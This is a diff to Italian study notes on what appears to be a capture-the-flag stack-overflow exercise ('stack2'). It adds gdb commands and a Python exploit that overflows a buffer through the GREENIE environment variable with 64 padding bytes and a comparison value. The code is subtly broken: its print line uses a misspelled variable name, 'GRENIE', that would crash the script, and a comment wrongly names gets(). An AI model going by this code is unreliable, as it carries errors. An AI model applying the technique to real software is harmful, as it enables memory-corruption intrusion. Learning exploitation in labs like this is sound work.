@@ -45,3 +45,21 @@ L'idea è quella in primis con uno script python di settare la variabile di ambi
 Questo è stato il mio riferimento
 https://stackoverflow.com/questions/44479826/how-do-you-set-a-string-of-bytes-from-an-environment-variable-in-python
 scrivere i byte diretti nella variabile di ambiente per poi passare i byte per pownare la macchina.
+
+(gdb) display /4wx *(int*)$esp <- guarda cosa punta esp
+(gdb) b *0x080484a4    <- breakpoint ad una istruzione
+
+**exploit.py**
+```` python
+import os
+
+junk = '\x41'                 # Junk to overflow the buffer (gets())
+cmp = '\x0a\x0d\x0a\x0d'      # Value to pass the cmp instruction
+
+# Prepare the env variable
+os.environ["GREENIE"] = junk * 64 + cmp
+print(os.environ["GRENIE"])
+
+# Execute the binary inside this env
+os.system("./stack2")
+````
